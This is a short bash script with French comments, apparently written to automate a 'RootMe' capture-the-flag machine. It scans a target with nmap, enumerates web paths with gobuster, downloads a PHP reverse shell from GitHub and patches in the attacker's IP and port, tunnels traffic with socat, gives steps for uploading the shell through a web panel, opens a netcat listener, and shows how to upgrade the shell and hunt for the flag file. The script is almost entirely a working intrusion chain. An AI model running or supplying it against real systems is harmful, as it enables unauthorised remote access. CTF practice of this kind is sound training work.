#!/bin/bash
# Script d'automatisation RootMe CTF
# Auteur : miicha333l

# Variables à adapter
TARGET_IP="<IP_CIBLE>"  # Remplacez par l'IP de la machine cible
WORDLIST="/usr/share/wordlists/dirb/common.txt"
REVERSE_SHELL="php-reverse-shell.phtml"
LISTEN_PORT=4444
TUNNEL_PORT=8080

# 1. Scan de la machine cible
nmap -A -p- $TARGET_IP

# 2. Enumération web
if [ -f "$WORDLIST" ]; then
    gobuster dir -u http://$TARGET_IP -w $WORDLIST -x php,phtml,txt
else
    echo "Wordlist non trouvée, téléchargez-la ou adaptez le chemin."
fi

# 3. Téléchargement et préparation du shell inversé
wget -O $REVERSE_SHELL https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i "s/\$ip = '127.0.0.1'/\$ip = '$(hostname -I | awk '{print $1}')'/" $REVERSE_SHELL
sed -i "s/\$port = 1234/\$port = $LISTEN_PORT/" $REVERSE_SHELL

# 4. Création du tunnel socat
socat TCP-LISTEN:$TUNNEL_PORT,fork TCP:$TARGET_IP:80 &
echo "Tunnel socat actif sur localhost:$TUNNEL_PORT"

# 5. Instructions pour l'upload
echo "Copiez $REVERSE_SHELL sur votre bureau Windows pour l'uploader via le panel web :"
echo "cp $REVERSE_SHELL /mnt/c/Users/michael/OneDrive/Bureau/"
echo "Puis ouvrez http://localhost:$TUNNEL_PORT/panel/ dans votre navigateur Windows et uploadez le shell."

# 6. Listener Netcat
nc -lvnp $LISTEN_PORT

echo "Accédez à l'URL du shell uploadé pour déclencher la connexion."
echo "Passez en shell interactif : python -c 'import pty;pty.spawn(\"/bin/bash\")'"

echo "Pour trouver le flag : find / -type f -name user.txt 2>/dev/null"
